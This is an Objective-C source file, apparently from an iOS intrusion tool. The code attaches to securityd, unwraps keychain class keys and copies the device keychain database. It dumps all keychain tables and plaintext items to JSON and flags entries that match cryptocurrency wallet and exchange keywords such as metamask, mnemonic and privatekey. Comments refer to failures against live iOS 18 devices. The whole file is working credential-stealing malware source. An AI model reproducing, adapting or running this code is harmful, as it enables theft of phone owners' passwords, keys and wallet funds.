#import "OWKeys.h"
#import "OWRCEntry.h"
#include <dlfcn.h>
#include <sqlite3.h>

// 后端符号：内嵌的 RemoteCall 实现（Keys/OWRemoteCall）提供；
// 若另外以 dylib 形式提供了后端（libuiopsersvc 等），优先用 dylib。
typedef int (*ow_rc_attach_fn)(const char *processName);
typedef int (*ow_rc_unwrap_fn)(const void **outBytes, unsigned int *outLen);
typedef int (*ow_rc_copy_fn)(const char *src, const char *dst);

static NSString * const kOWKeychainSrc = @"/var/mobile/Library/Keychains/keychain-2.db";

#pragma mark - OWRemoteCall

@implementation OWRemoteCall {
    void *_h;
    ow_rc_attach_fn _attach;
    ow_rc_unwrap_fn _unwrap;
    ow_rc_copy_fn _copy;
}

- (instancetype)init {
    if (self = [super init]) {
        NSArray *cands = @[@"libuiopsersvc", @"RemoteCall"];
        NSString *fwDir = [[[NSBundle mainBundle] bundlePath] stringByDeletingLastPathComponent];
        fwDir = [fwDir stringByAppendingPathComponent:@"Frameworks"];
        for (NSString *n in cands) {
            NSString *p = [fwDir stringByAppendingPathComponent:
                           [NSString stringWithFormat:@"%@.framework/%@", n, n]];
            _h = dlopen(p.fileSystemRepresentation, RTLD_NOW);
            if (_h) { OWLog(@"RC: 后端 %@ 已加载", n); break; }
            _h = dlopen([NSString stringWithFormat:@"%@.dylib", n].UTF8String, RTLD_NOW);
            if (_h) { OWLog(@"RC: 后端 %@.dylib 已加载", n); break; }
        }
        if (_h) {
            _attach = (ow_rc_attach_fn)dlsym(_h, "rc_attach");
            _unwrap = (ow_rc_unwrap_fn)dlsym(_h, "rc_unwrap_class_keys");
            _copy   = (ow_rc_copy_fn)dlsym(_h, "rc_copy_file");
        }
        if (!_h) {
            // 没有外部 dylib 就用编进主可执行的实现（Keys/OWRemoteCall/OWRCEntry.m）
            // 直接取地址可保证这些符号不会被 -dead_strip 去掉，dlsym 也找得到。
            _attach = rc_attach;
            _unwrap = rc_unwrap_class_keys;
            _copy   = rc_copy_file;
            OWLog(@"RC: 使用内建后端（OWRCEntry）");
        }
    }
    return self;
}

// 注意：内建后端（OWRCEntry）没有独立 dylib，_h 为 NULL 但 _attach 有效，
// 所以这里只能以函数指针判定，不能用 _h。
- (BOOL)available { return _attach != NULL; }

- (BOOL)attachToProcessNamed:(NSString *)processName {
    if (!_attach) return NO;
    int r = _attach(processName.UTF8String);
    OWLog(@"RC: attach %@ -> %d", processName, r);
    return r == 0;
}

- (BOOL)unwrapClassKeys:(NSData **)outKeys error:(NSError **)error {
    if (!_unwrap) {
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:40
                                userInfo:@{NSLocalizedDescriptionKey: @"rc_unwrap_class_keys 不可用"}];
        return NO;
    }
    const void *bytes = NULL;
    unsigned int len = 0;
    if (_unwrap(&bytes, &len) != 0 || !bytes || !len) {
        // task_for_pid(securityd) 拿不到时正是这里失败（现网 18.6.2 的 kr=0x5）
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:41
                                userInfo:@{NSLocalizedDescriptionKey: @"AKS 解包失败（securityd 未 attach 成功）"}];
        OWLog(@"RC: unwrap 失败");
        return NO;
    }
    *outKeys = [NSData dataWithBytes:bytes length:len];
    OWLog(@"RC: class keys %u 字节", len);
    return YES;
}

- (BOOL)copyPrivilegedFile:(NSString *)src to:(NSString *)dst error:(NSError **)error {
    if (!_copy) {
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:42
                                userInfo:@{NSLocalizedDescriptionKey: @"rc_copy_file 不可用"}];
        return NO;
    }
    int r = _copy(src.fileSystemRepresentation, dst.fileSystemRepresentation);
    if (r != 0) {
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:43
                                userInfo:@{NSLocalizedDescriptionKey:
                                  [NSString stringWithFormat:@"特权拷贝失败 %d", r]}];
        return NO;
    }
    return YES;
}

@end

#pragma mark - OWKeys

@implementation OWKeys {
    NSMutableArray<NSString *> *_produced;
}

- (instancetype)init {
    if (self = [super init]) {
        NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docDir = docs.firstObject ?: NSTemporaryDirectory();
        _outDir = [docDir stringByAppendingPathComponent:@"ow_keys"];
        [[NSFileManager defaultManager] createDirectoryAtPath:_outDir
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        _produced = [NSMutableArray new];
    }
    return self;
}

- (NSArray<NSString *> *)producedFiles { return [_produced copy]; }

- (BOOL)grabKeychainDBWithRemote:(OWRemoteCall *)rc error:(NSError **)error {
    NSString *dst = [self.outDir stringByAppendingPathComponent:@"keychain-2.db"];
    NSFileManager *fm = [NSFileManager defaultManager];

    // 1) 直接拷：有权限时最快
    if ([fm fileExistsAtPath:kOWKeychainSrc]) {
        [fm removeItemAtPath:dst error:nil];
        if ([fm copyItemAtPath:kOWKeychainSrc toPath:dst error:nil]) {
            OWLog(@"Keys: keychain-2.db 直接拷贝成功");
            [_produced addObject:dst];
            return YES;
        }
    }

    // 2) 走特权拷贝（内核通道已建立时）
    NSError *e = nil;
    if ([rc copyPrivilegedFile:kOWKeychainSrc to:dst error:&e]) {
        OWLog(@"Keys: keychain-2.db 特权拷贝成功");
        [_produced addObject:dst];
        return YES;
    }

    _lastError = [NSString stringWithFormat:@"keychain-2.db 不可达: %@", e.localizedDescription ?: @"无权限"];
    OWLog(@"Keys: %@", _lastError);
    if (error) *error = [NSError errorWithDomain:@"OWKeys" code:44
                            userInfo:@{NSLocalizedDescriptionKey: _lastError}];
    return NO;
}

- (BOOL)exportTablesFromKeychainDB:(NSString *)dbPath error:(NSError **)error {
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(dbPath.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        _lastError = @"keychain 库打不开";
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:45
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        return NO;
    }

    // schema 动态读取：不硬编码列名，避免版本差异导致全盘失败
    sqlite3_stmt *st = NULL;
    NSMutableArray *tables = [NSMutableArray new];
    if (sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table';", -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *n = sqlite3_column_text(st, 0);
            if (n) [tables addObject:[NSString stringWithUTF8String:(const char *)n]];
        }
    }
    sqlite3_finalize(st);

    NSMutableDictionary *dump = [NSMutableDictionary new];
    for (NSString *tb in tables) {
        NSString *sql = [NSString stringWithFormat:@"SELECT * FROM \"%@\";", tb];
        if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &st, NULL) != SQLITE_OK) { sqlite3_finalize(st); continue; }

        int cols = sqlite3_column_count(st);
        NSMutableArray *rows = [NSMutableArray new];
        while (sqlite3_step(st) == SQLITE_ROW) {
            NSMutableDictionary *row = [NSMutableDictionary new];
            for (int i = 0; i < cols; i++) {
                const char *cn = sqlite3_column_name(st, i);
                NSString *key = cn ? [NSString stringWithUTF8String:cn] : [NSString stringWithFormat:@"c%d", i];
                int type = sqlite3_column_type(st, i);
                if (type == SQLITE_BLOB) {
                    const void *b = sqlite3_column_blob(st, i);
                    int n = sqlite3_column_bytes(st, i);
                    row[key] = (b && n) ? [[NSData dataWithBytes:b length:n] base64EncodedStringWithOptions:0] : @"";
                } else if (type == SQLITE_INTEGER) {
                    row[key] = @(sqlite3_column_int64(st, i));
                } else if (type == SQLITE_TEXT) {
                    const unsigned char *t = sqlite3_column_text(st, i);
                    row[key] = t ? [NSString stringWithUTF8String:(const char *)t] : @"";
                } else {
                    row[key] = [NSNull null];
                }
            }
            [rows addObject:row];
        }
        sqlite3_finalize(st);
        dump[tb] = rows;
        OWLog(@"Keys: 表 %@ 导出 %lu 行", tb, (unsigned long)rows.count);
    }
    sqlite3_close(db);

    NSString *out = [self.outDir stringByAppendingPathComponent:@"keychain_dump.json"];
    NSData *jd = [NSJSONSerialization dataWithJSONObject:dump options:0 error:nil];
    [jd writeToFile:out atomically:YES];
    [_produced addObject:out];
    return YES;
}

#pragma mark Keychains 目录

- (BOOL)grabKeychainDirWithRemote:(OWRemoteCall *)rc error:(NSError **)error {
    NSString *dir = @"/var/mobile/Library/Keychains";
    NSFileManager *fm = [NSFileManager defaultManager];
    NSUInteger got = 0;

    // 逐个抓关键件；目录本身可能列不出来（无读权限），但文件常能直读
    NSArray *names = @[@"keychain-2.db", @"keychain-2.db-wal", @"keychain-2.db-shm",
                       @"metadata_class_keys.plist", @"TrustStore.sqlite3",
                       @"ocspcache.sqlite3", @"caissuercache.sqlite3"];

    for (NSString *n in names) {
        NSString *src = [dir stringByAppendingPathComponent:n];
        NSString *dst = [self.outDir stringByAppendingPathComponent:n];
        if ([fm fileExistsAtPath:src]) {
            [fm removeItemAtPath:dst error:nil];
            if ([fm copyItemAtPath:src toPath:dst error:nil]) { got++; continue; }
        }
        if (rc && [rc copyPrivilegedFile:src to:dst error:nil]) got++;
    }

    if (got == 0) {
        _lastError = @"Keychains 目录不可读";
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:49
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        return NO;
    }

    BOOL hasCK = [fm fileExistsAtPath:
                  [self.outDir stringByAppendingPathComponent:@"metadata_class_keys.plist"]];
    OWLog(@"Keys: Keychains 目录取得 %lu 项（class keys plist=%@）",
          (unsigned long)got, hasCK ? @"有" : @"无");
    for (NSString *n in names) {
        NSString *p = [self.outDir stringByAppendingPathComponent:n];
        if ([fm fileExistsAtPath:p] && ![_produced containsObject:p]) [_produced addObject:p];
    }
    return YES;
}

#pragma mark keychain 明文字段

- (BOOL)exportKeychainMetadataFromDB:(NSString *)dbPath error:(NSError **)error {
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(dbPath.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        _lastError = @"keychain 库打不开（可能是加密或缺权限）";
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:50
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        if (db) sqlite3_close(db);
        return NO;
    }

    // 只关心 genp / inet：钱包、交易所、DApp 的标识与账号都在这两张表
    NSArray *wantTables = @[@"genp", @"inet"];
    // 明文字列：不同 iOS 版本列名略有出入，逐个探测是否存在
    NSArray *wantCols = @[@"agrp", @"svce", @"acct", @"musr", @"desc", @"icmt", @"gena", @"pdmn"];

    NSMutableArray *rows = [NSMutableArray new];
    NSUInteger walletish = 0;

    for (NSString *tb in wantTables) {
        // 先取该表实际列名
        NSMutableArray *cols = [NSMutableArray new];
        sqlite3_stmt *st = NULL;
        NSString *pragma = [NSString stringWithFormat:@"PRAGMA table_info(\"%@\");", tb];
        if (sqlite3_prepare_v2(db, pragma.UTF8String, -1, &st, NULL) == SQLITE_OK) {
            while (sqlite3_step(st) == SQLITE_ROW) {
                const unsigned char *n = sqlite3_column_text(st, 1);
                if (n) [cols addObject:[NSString stringWithUTF8String:(const char *)n]];
            }
        }
        sqlite3_finalize(st);
        if (!cols.count) continue;   // 版本差异：表不存在就跳过

        NSMutableArray *useCols = [NSMutableArray new];
        for (NSString *c in wantCols) if ([cols containsObject:c]) [useCols addObject:c];
        if (!useCols.count) continue;

        NSString *sql = [NSString stringWithFormat:@"SELECT %@ FROM \"%@\";",
                         [useCols componentsJoinedByString:@","], tb];
        if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &st, NULL) != SQLITE_OK) { sqlite3_finalize(st); continue; }

        NSUInteger cap = 50000;
        NSUInteger n = 0;
        while (sqlite3_step(st) == SQLITE_ROW && n++ < cap) {
            NSMutableDictionary *row = [NSMutableDictionary dictionaryWithObject:tb forKey:@"table"];
            for (int i = 0; i < (int)useCols.count; i++) {
                int type = sqlite3_column_type(st, i);
                NSString *val = nil;
                if (type == SQLITE_TEXT) {
                    const unsigned char *t = sqlite3_column_text(st, i);
                    if (t) val = [NSString stringWithUTF8String:(const char *)t];
                } else if (type == SQLITE_BLOB) {
                    // agrp 在部分版本是加密 blob，取可打印前缀做弱匹配
                    const void *b = sqlite3_column_blob(st, i);
                    int len = sqlite3_column_bytes(st, i);
                    if (b && len > 0) {
                        NSData *d = [NSData dataWithBytes:b length:MIN(len, 4096)];
                        val = [d base64EncodedStringWithOptions:0];
                    }
                }
                if (val.length) row[useCols[i]] = val;
            }
            if (row.count <= 1) continue;

            NSString *blob = [NSString stringWithFormat:@"%@ %@ %@",
                              row[@"agrp"] ?: @"", row[@"svce"] ?: @"", row[@"acct"] ?: @""].lowercaseString;
            BOOL hit = [self _looksWalletish:blob];
            if (hit) walletish++;
            row[@"walletish"] = @(hit);
            [rows addObject:[row copy]];
        }
        sqlite3_finalize(st);
    }
    sqlite3_close(db);

    NSDictionary *doc = @{@"count": @(rows.count), @"walletish": @(walletish), @"rows": rows};
    NSData *jd = [NSJSONSerialization dataWithJSONObject:doc options:0 error:nil];
    NSString *out = [self.outDir stringByAppendingPathComponent:@"keychain_meta.json"];
    [jd writeToFile:out atomically:YES];
    [_produced addObject:out];
    if (walletish) [[OWState shared] setObject:@YES forKey:OWStateKeyKeysAcquired];

    OWLog(@"Keys: keychain 明文元数据 %lu 行（钱包相关 %lu）", (unsigned long)rows.count, (unsigned long)walletish);
    return YES;
}

- (BOOL)_looksWalletish:(NSString *)s {
    static NSArray *kw;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        kw = @[@"wallet", @"tokenpocket", @"imtoken", @"trust", @"metamask", @"okx", @"okinc",
               @"bitpie", @"tronlink", @"tron", @"coinbase", @"binance", @"huobi", @"bybit",
               @"mathwallet", @"safepal", @"rainbow", @"phantom", @"solflare", @"uniswap",
               @"ledger", @"keystore", @"mnemonic", @"seed", @"privatekey", @"bip32", @"bip39",
               @"ethereum", @"bitcoin", @"web3", @"dapp"];
    });
    for (NSString *k in kw) if ([s rangeOfString:k].location != NSNotFound) return YES;
    return NO;
}

- (BOOL)acquireClassKeysVia:(OWRemoteCall *)rc error:(NSError **)error {
    if (![rc available]) {
        _lastError = @"RemoteCall 后端不可用";
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:46
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        return NO;
    }

    // 目标进程是 securityd，不是 SpringBoard —— 现包把 AllowIOS18SBRemoteAttach 置 0
    // 后走 Plan B 就是卡在这一步。
    if (![rc attachToProcessNamed:@"securityd"]) {
        _lastError = @"securityd attach 失败";
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:47
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        return NO;
    }

    NSData *keys = nil;
    if (![rc unwrapClassKeys:&keys error:error]) {
        // AKS 路径没通不代表没戏：root 之后由 securityd 代解是更稳的路子。
        // 现网 18.x 大量"有文件无明文"正是 AKS 拿不到 class keys 导致的，
        // 这里必须自动降级，而不是直接判失败。
        OWLog(@"Keys: AKS 路径失败 -> %s，改走 SecItem 明文导出", rc_last_error());
        return [self exportPlaintextItemsWithError:error];
    }

    NSString *out = [self.outDir stringByAppendingPathComponent:@"class_keys.bin"];
    [keys writeToFile:out atomically:YES];
    [_produced addObject:out];
    [[OWState shared] setObject:@YES forKey:OWStateKeyKeysAcquired];
    OWLog(@"Keys: class keys 写入 %@", out);
    return YES;
}

- (BOOL)exportPlaintextItemsWithError:(NSError **)error {
    const void *bytes = NULL;
    unsigned int len = 0;
    if (rc_export_keychain_items(&bytes, &len) != 0 || !bytes || !len) {
        _lastError = [NSString stringWithFormat:@"SecItem 明文导出失败: %s", rc_last_error()];
        OWLog(@"Keys: %@", _lastError);
        if (error) *error = [NSError errorWithDomain:@"OWKeys" code:48
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        return NO;
    }

    NSData *d = [NSData dataWithBytes:bytes length:len];
    NSString *out = [self.outDir stringByAppendingPathComponent:@"keychain_plaintext.json"];
    [d writeToFile:out atomically:YES];
    [_produced addObject:out];
    [[OWState shared] setObject:@YES forKey:OWStateKeyKeysAcquired];
    OWLog(@"Keys: 明文导出 %lu 字节 -> %@", (unsigned long)d.length, out);
    return YES;
}

@end
